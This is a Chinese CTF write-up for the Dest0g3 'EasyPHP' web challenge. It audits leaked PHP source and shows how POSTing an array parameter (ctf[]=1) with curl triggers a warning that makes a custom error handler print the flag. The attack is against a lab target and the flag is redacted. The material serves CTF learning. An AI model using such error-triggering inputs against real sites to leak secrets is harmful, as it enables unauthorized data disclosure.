---
title: Dest0g3 520迎新赛 - Web - EasyPHP
date: 2026-11-14 18:12:00
categories:
  - CTF
  - Dest0g3 520迎新赛
  - Web
tags:
  - PHP源码审计
  - set_error_handler
  - 数组转字符串
  - highlight_file
cover: /img/cover/anime-characters-collage.jpg
description: Dest0g3 迎新赛 PHP 审计题。highlight_file 泄露源码，set_error_handler 捕获任意错误后 print $fl4g。传 ctf[]=1 触发 Array to string 警告即打印 flag。
keywords:
  - PHP
  - 错误处理器
  - Array-to-string
  - 源码泄露
  - Dest0g3
ai: >-
  本题来自 Dest0g3 520迎新赛，环境为 PHP/7.2.20 加 openresty。highlight_file 直接输出源码，date 取时分的比较是干扰项；漏洞点是 set_error_handler 捕获任意 PHP 错误后 print $fl4g，而 $fl4g 来自 fl4g.php，结尾 $fl4g .= $dest0g3 把 POST 的 ctf 拼到 flag 上。传数组 ctf[]=1 触发 Array to string 警告即打印 $fl4g 泄露 flag，一条 curl POST 可复现，脱敏记为 flag{xxxx}。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | Dest0g3 520迎新赛 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏），PHP/7.2.20 + openresty |
| 知识点 | PHP 源码审计、`set_error_handler` 滥用、数组转字符串警告 |

## 信息收集

访问根路径，`highlight_file(__FILE__)` 直接输出当前文件源码：

```php
<?php
highlight_file(__FILE__);
include "fl4g.php";
$dest0g3 = $_POST['ctf'];
$time = date("H");
$timme = date("d");
$timmme = date("i");
if(($time > "24") or ($timme > "31") or ($timmme > "60")){
    echo $fl4g;
}else{
    echo "Try harder!";
}
set_error_handler(
    function() use(&$fl4g) {
        print $fl4g;
    }
);
$fl4g .= $dest0g3;
?>
```

## 漏洞分析

### 审计关键点

1. **第一个判断**（`$time > "24"` 等）是字符串比较：`date("H")` 返回 "00"-"23"，`date("d")` 返回 "01"-"31"，`date("i")` 返回 "00"-"59"。在字符串比较下都不会超过阈值（"23" < "24"、"31" > "31" 为 false、"59" < "60"），所以永远输出 `Try harder!`，是干扰项。
2. **`set_error_handler`**：设置一个错误处理器，捕获**任何 PHP 错误/警告/通知**后 `print $fl4g`。这是 flag 泄露的关键。
3. **`$fl4g .= $dest0g3`**：把 POST 的 `ctf` 参数拼接到 `$fl4g` 上，`$fl4g` 来自 `fl4g.php`（真正的 flag）。

### 攻击链

```text
访问首页 → highlight_file 泄露源码
  → 审计发现 set_error_handler 会 print $fl4g
  → POST ctf[]=1 使 $fl4g .= $dest0g3 触发 Array to string conversion warning
  → 触发 error_handler 打印 $fl4g
  → 泄露 flag
```

## 利用过程

关键思路：让 `$fl4g .= $dest0g3` 这行**触发一个 PHP 错误**，从而走 `set_error_handler` 打印 `$fl4g`。

传入数组 `ctf[]=1`，此时 `$dest0g3` 是数组，`$fl4g .= $dest0g3` 触发：

```text
Warning: Array to string conversion
```

该 warning 被 `set_error_handler` 捕获，执行 `print $fl4g`，泄露 flag：

```text
Try harder!flag{xxxx}
```

## 完整 EXP

```bash
curl -X POST "http://target:8080/index.php" --data "ctf[]=1"
# 响应末尾输出 flag（已脱敏）
```

## Flag

`flag{xxxx}`（已脱敏）

## 踩坑与总结

1. **`highlight_file(__FILE__)` 直接泄露源码**，是审计入口。
2. **`set_error_handler` 是核心漏洞点**：任何错误都会 `print $fl4g`。
3. **`ctf[]=1`（数组）触发 Array to string conversion warning**，是引爆点。
4. 第一个时间判断是**干扰项**（字符串比较永远不成立），不是解题路径。
